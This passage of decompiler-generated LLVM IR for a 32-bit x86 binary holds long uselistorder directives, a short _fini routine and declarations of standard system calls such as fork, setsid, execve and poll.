  uselistorder i32 -4, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 12, 29, 56, 57, 58, 59, 69, 70, 71, 72, 10, 73, 2, 68, 30, 60, 11, 61, 62, 63, 13, 74, 75, 76, 77, 78, 79, 14, 67, 65, 66, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 7, 5, 6, 8, 3, 64, 0, 42, 43, 44, 45, 9, 16, 46, 47, 48, 1, 49, 50, 51, 52, 53, 15, 4, 54, 55 }
  uselistorder i32 ptrtoint (i32* @global_var_8061000.767 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, {}
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_80568d6, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_80568eb = load i32, i32* @ebx, align 4
  %v1_80568ec = call i32 @__get_pc_thunk_bx(i32 %v0_80568eb)
  store i32 %v1_80568ec, i32* @eax, align 4
  %v0_80568f7 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_80568f7

; uselistorder directives
  uselistorder i32* @eax, { 15, 2, 37, 117, 4, 118, 119, 3, 120, 0, 36, 1, 116, 121, 38, 122, 64, 65, 67, 16, 66, 123, 125, 124, 6, 7, 95, 96, 187, 126, 44, 131, 45, 132, 133, 134, 47, 135, 5, 49, 50, 151, 152, 51, 153, 52, 154, 155, 53, 54, 55, 156, 157, 158, 159, 56, 160, 161, 162, 163, 57, 144, 175, 189, 60, 190, 191, 193, 61, 194, 8, 192, 13, 14, 188, 114, 17, 68, 69, 168, 70, 176, 178, 179, 177, 71, 72, 180, 181, 183, 184, 182, 164, 58, 9, 10, 140, 141, 142, 46, 143, 136, 137, 138, 139, 73, 74, 145, 146, 75, 76, 97, 99, 98, 100, 101, 103, 63, 102, 93, 94, 147, 148, 48, 149, 150, 127, 39, 40, 128, 41, 129, 42, 43, 130, 18, 77, 78, 79, 80, 81, 19, 82, 59, 21, 20, 23, 22, 24, 83, 25, 26, 84, 85, 86, 87, 27, 88, 28, 89, 29, 90, 30, 91, 31, 92, 104, 105, 32, 33, 106, 107, 108, 109, 110, 111, 112, 34, 113, 35, 62, 115, 165, 166, 167, 169, 170, 171, 172, 173, 174, 195, 185, 186, 11, 12 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1924, 15, 16, 17, 67, 1515, 1925, 1928, 1926, 1927, 1516, 1745, 1746, 18, 69, 1931, 1939, 1933, 1934, 19, 58, 1935, 1936, 1937, 1517, 1938, 68, 140, 141, 142, 1929, 1930, 150, 1940, 1941, 1943, 1944, 1942, 1945, 299, 1946, 1947, 1948, 1949, 1950, 1951, 151, 152, 1518, 380, 381, 119, 1634, 1519, 1635, 1636, 72, 73, 1637, 1638, 1639, 1477, 1640, 71, 1520, 70, 1521, 153, 0, 1, 1522, 154, 155, 1523, 1524, 1525, 156, 1526, 1954, 1527, 1952, 284, 1953, 382, 383, 157, 2, 3, 1528, 1955, 1956, 1957, 1958, 1959, 384, 1529, 1530, 158, 1960, 20, 74, 1888, 122, 123, 1531, 1961, 75, 1532, 21, 159, 1747, 385, 1962, 1963, 1964, 1748, 1749, 14, 300, 161, 160, 1750, 1751, 301, 1752, 1753, 162, 163, 1533, 1965, 1966, 1534, 1754, 1535, 1755, 1756, 1757, 1758, 1967, 164, 1536, 165, 386, 1970, 1971, 1972, 1973, 130, 22, 1974, 76, 1987, 1988, 2001, 2002, 2003, 2004, 2010, 2011, 2012, 2013, 2005, 2006, 2007, 2008, 2009, 77, 78, 1537, 2014, 2015, 79, 80, 81, 1538, 2016, 2017, 2018, 2019, 2020, 2021, 2022, 2023, 2024, 2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032, 2033, 166, 2095, 2096, 167, 2097, 2098, 2099, 82, 131, 302, 143, 1539, 132, 1759, 168, 1760, 23, 133, 124, 1761, 271, 169, 1762, 125, 1763, 1975, 1976, 1983, 303, 1984, 1540, 1764, 387, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1772, 170, 1541, 1773, 1774, 1775, 1776, 171, 1777, 1542, 172, 265, 388, 173, 1543, 1544, 1545, 304, 1778, 2076, 2077, 2078, 305, 294, 295, 2079, 2080, 2081, 2082, 2083, 2084, 1546, 306, 1779, 174, 1547, 1780, 175, 307, 308, 1781, 1782, 1548, 1783, 1784, 1785, 1786, 115, 2170, 2171, 2172, 2173, 126, 272, 134, 1787, 273, 1549, 1550, 1551, 1788, 176, 1789, 2107, 2122, 2123, 2124, 389, 2125, 1901, 2126, 1649, 2175, 2176, 2177, 2178, 2179, 1641, 2180, 2127, 2128, 2181, 177, 2182, 2193, 2194, 24, 149, 1552, 25, 1553, 1554, 2204, 2208, 274, 2209, 178, 1441, 390, 391, 4, 2183, 2184, 2185, 179, 180, 1602, 1476, 181, 1555, 1868, 309, 310, 182, 1869, 1870, 183, 184, 1872, 1871, 1873, 1874, 392, 1442, 1875, 1877, 1876, 1878, 2186, 2187, 185, 1556, 2192, 1693, 1694, 1695, 1696, 1557, 1558, 1697, 369, 1559, 311, 186, 187, 188, 393, 394, 127, 395, 1880, 1879, 396, 1887, 189, 190, 1560, 1642, 1561, 1643, 191, 1562, 192, 1563, 1915, 83, 1916, 1917, 1918, 5, 1564, 2056, 397, 1644, 1645, 1646, 1647, 1565, 193, 2195, 1443, 194, 312, 2197, 2200, 2199, 2131, 2132, 2133, 2134, 2135, 313, 2136, 2137, 2138, 398, 2129, 399, 2130, 400, 1566, 1650, 144, 1651, 314, 1567, 1652, 1568, 1569, 401, 1444, 1570, 402, 1445, 195, 1571, 2139, 2140, 196, 197, 403, 1446, 146, 2141, 2142, 2143, 198, 199, 404, 1447, 145, 2144, 275, 2145, 128, 2146, 2147, 2149, 1572, 2148, 6, 1648, 7, 2198, 1881, 1882, 1883, 1884, 1886, 1885, 8, 315, 2108, 2109, 2110, 2034, 1573, 316, 2035, 1574, 2036, 2037, 2038, 2040, 2041, 2042, 2043, 2044, 2045, 2046, 2047, 2100, 2085, 200, 201, 1575, 1576, 317, 2205, 2207, 26, 1932, 202, 203, 1790, 1791, 147, 1792, 204, 1577, 1793, 276, 135, 1794, 84, 2039, 60, 9, 1578, 318, 319, 205, 1795, 1796, 1797, 206, 1985, 85, 1579, 1977, 1580, 1982, 1981, 277, 1581, 1582, 1978, 1980, 1979, 278, 1583, 1653, 1986, 1654, 1798, 1799, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 207, 1584, 1807, 320, 1808, 1809, 1810, 1811, 1812, 27, 28, 1585, 296, 297, 1813, 1814, 1815, 1816, 29, 1817, 1818, 1819, 30, 1586, 1820, 31, 32, 208, 1587, 1821, 1822, 1823, 1826, 1824, 1825, 33, 61, 86, 1827, 1828, 1829, 1830, 370, 1831, 1832, 209, 1833, 210, 1834, 1588, 279, 1835, 211, 1836, 1589, 1837, 1838, 1840, 1841, 1842, 1843, 1844, 1845, 212, 1590, 1591, 213, 1846, 1847, 1592, 1848, 1849, 1850, 1851, 1852, 1593, 1853, 1854, 321, 1594, 322, 1855, 1856, 1857, 1858, 1859, 1860, 34, 87, 88, 89, 1595, 1861, 214, 1596, 1862, 1448, 1863, 1864, 215, 1597, 129, 59, 116, 1839, 280, 1742, 1743, 2188, 2189, 281, 2191, 2190, 90, 405, 1598, 1989, 1990, 1991, 1992, 1993, 1994, 1995, 1996, 1997, 1998, 323, 1999, 1599, 1600, 2000, 324, 1865, 216, 1968, 1601, 1969, 2174, 217, 1919, 2196, 1655, 2086, 2106, 1656, 2113, 2201, 148, 325, 2168, 2206, 2114, 2169, 1657, 2115, 218, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 2064, 2116, 2117, 1667, 2202, 2203, 1478, 266, 1668, 267, 1669, 1671, 1670, 1672, 1673, 1479, 409, 410, 329, 330, 328, 1674, 35, 219, 220, 326, 406, 221, 1480, 1675, 222, 327, 1676, 1677, 91, 136, 408, 225, 223, 224, 407, 1678, 1679, 1680, 1681, 1683, 285, 1682, 1481, 1684, 1685, 226, 227, 228, 331, 229, 348, 93, 1687, 411, 1686, 413, 414, 92, 412, 415, 416, 230, 1688, 332, 1689, 371, 1690, 1691, 1692, 333, 137, 138, 429, 1449, 1483, 436, 437, 334, 1699, 286, 287, 1482, 1698, 1484, 438, 439, 426, 1450, 1700, 1702, 427, 1451, 428, 1452, 1701, 98, 1703, 1485, 440, 441, 423, 1453, 1704, 1706, 424, 425, 1454, 1705, 97, 1707, 1486, 442, 443, 420, 1455, 1708, 1710, 421, 1456, 422, 1457, 1709, 96, 1711, 1487, 444, 445, 417, 1458, 1712, 1714, 418, 1459, 419, 1460, 1713, 95, 1715, 372, 1716, 1717, 1718, 1719, 1488, 446, 447, 430, 1461, 1720, 1722, 431, 1462, 432, 1463, 1721, 94, 1723, 120, 121, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1489, 448, 449, 1490, 450, 451, 433, 1464, 1733, 1491, 452, 453, 434, 1465, 1734, 1735, 1492, 1736, 1737, 1493, 1494, 454, 455, 435, 1466, 1738, 1739, 1495, 456, 457, 1740, 1741, 1496, 1497, 458, 459, 1498, 1499, 460, 461, 1500, 498, 499, 1501, 462, 463, 1502, 464, 465, 1503, 466, 467, 1504, 468, 469, 1505, 470, 471, 472, 473, 1744, 268, 36, 1866, 1867, 37, 62, 231, 474, 475, 232, 476, 477, 99, 1889, 349, 1890, 38, 350, 1891, 269, 1892, 1506, 478, 479, 1507, 480, 481, 1508, 482, 483, 1509, 484, 485, 1510, 486, 487, 270, 1511, 488, 489, 1893, 373, 1894, 1895, 1896, 1897, 335, 1898, 1467, 1899, 1900, 139, 1902, 1903, 293, 291, 39, 292, 1904, 374, 1905, 1906, 1907, 1908, 10, 1909, 336, 1910, 233, 290, 288, 40, 289, 1911, 1912, 1913, 1914, 298, 491, 234, 490, 1468, 1469, 235, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1470, 1627, 1628, 1471, 354, 1629, 351, 352, 353, 1630, 1631, 1472, 493, 1632, 1920, 1921, 41, 102, 1922, 42, 43, 492, 1923, 100, 63, 101, 337, 1473, 11, 236, 237, 238, 2048, 494, 2049, 2050, 2051, 338, 2052, 107, 2053, 2054, 2055, 64, 103, 104, 105, 106, 1474, 2057, 239, 240, 241, 242, 2058, 2060, 2061, 2062, 243, 2063, 244, 245, 246, 355, 2059, 375, 495, 496, 339, 356, 340, 12, 341, 1512, 497, 2065, 247, 248, 249, 250, 342, 2066, 251, 252, 357, 2067, 2068, 253, 44, 45, 2073, 108, 65, 2074, 358, 2069, 2070, 343, 254, 2071, 2072, 376, 255, 256, 257, 359, 1475, 2075, 2087, 2088, 2089, 1513, 360, 258, 259, 362, 2090, 260, 361, 2091, 109, 46, 66, 47, 2092, 344, 110, 111, 500, 118, 2094, 345, 2093, 502, 503, 112, 501, 504, 505, 2101, 2102, 377, 2103, 2104, 48, 2105, 49, 378, 113, 1514, 2111, 261, 262, 506, 2112, 263, 346, 2118, 2119, 2120, 2121, 347, 50, 2150, 2151, 2152, 507, 508, 2162, 51, 52, 117, 53, 365, 366, 2153, 2154, 2155, 2156, 282, 363, 364, 367, 2157, 2158, 2159, 2160, 54, 55, 114, 2161, 379, 56, 57, 2163, 2164, 368, 13, 2165, 2166, 2167, 264, 1633, 283, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 2210, 2211, 2212, 2213, 2214, 2215, 2216, 2217 }
  uselistorder i32* @ebx, { 76, 168, 169, 328, 330, 333, 334, 335, 336, 337, 331, 329, 332, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 358, 359, 0, 360, 361, 362, 363, 364, 365, 366, 367, 368, 291, 292, 170, 171, 172, 369, 3, 370, 371, 372, 4, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 173, 174, 175, 176, 384, 385, 639, 640, 6, 393, 391, 392, 394, 397, 395, 396, 398, 399, 400, 5, 429, 401, 1, 444, 445, 446, 447, 448, 449, 7, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 402, 403, 404, 405, 8, 414, 9, 415, 416, 177, 178, 179, 180, 10, 181, 182, 183, 11, 184, 12, 185, 186, 187, 188, 13, 189, 190, 191, 192, 193, 194, 195, 703, 704, 14, 705, 706, 709, 710, 196, 197, 627, 628, 629, 641, 15, 642, 643, 307, 308, 644, 645, 103, 104, 105, 711, 712, 713, 714, 715, 716, 717, 89, 718, 646, 647, 648, 649, 650, 719, 720, 721, 34, 35, 734, 735, 736, 753, 754, 755, 756, 31, 16, 29, 737, 747, 751, 752, 722, 272, 273, 274, 275, 276, 277, 278, 279, 723, 724, 725, 726, 733, 154, 155, 280, 281, 282, 283, 284, 285, 286, 290, 90, 91, 92, 93, 94, 95, 316, 317, 17, 2, 318, 478, 479, 97, 319, 320, 321, 96, 98, 480, 481, 482, 743, 744, 99, 100, 101, 102, 651, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 18, 666, 667, 652, 653, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 19, 117, 118, 119, 120, 121, 122, 123, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 32, 679, 680, 681, 682, 683, 20, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 741, 742, 287, 288, 289, 464, 465, 466, 467, 468, 469, 21, 470, 471, 472, 608, 609, 610, 611, 612, 757, 758, 759, 760, 761, 762, 763, 767, 768, 606, 607, 198, 199, 619, 620, 200, 201, 202, 203, 204, 205, 206, 417, 418, 419, 420, 421, 422, 423, 424, 406, 409, 410, 411, 412, 413, 407, 408, 124, 125, 126, 127, 425, 426, 427, 428, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 243, 244, 22, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 23, 258, 259, 260, 261, 262, 72, 73, 74, 75, 238, 240, 239, 241, 242, 24, 164, 165, 166, 167, 727, 25, 728, 729, 730, 731, 33, 26, 30, 732, 769, 770, 771, 772, 773, 430, 431, 432, 433, 434, 435, 27, 436, 28, 437, 438, 439, 440, 441, 442, 443, 263, 264, 265, 266, 267, 268, 386, 387, 388, 389, 390, 707, 708, 322, 323, 739, 740, 128, 129, 613, 614, 625, 626, 130, 131, 132, 630, 631, 745, 746, 698, 699, 700, 764, 765, 766, 632, 633, 701, 702, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 601, 602, 634, 635, 636, 637, 638, 143, 144, 145, 738, 748, 749, 750, 146, 147, 148, 149, 150, 151, 152, 153, 156, 157, 158, 159, 160, 161, 162, 163, 269, 270, 271, 303, 304, 305, 306, 309, 310, 311, 312, 313, 314, 315, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 324, 325, 326, 327, 473, 474, 475, 476, 477, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 603, 604, 605, 615, 616, 617, 618, 621, 622, 623, 624, 694, 695, 696, 697 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
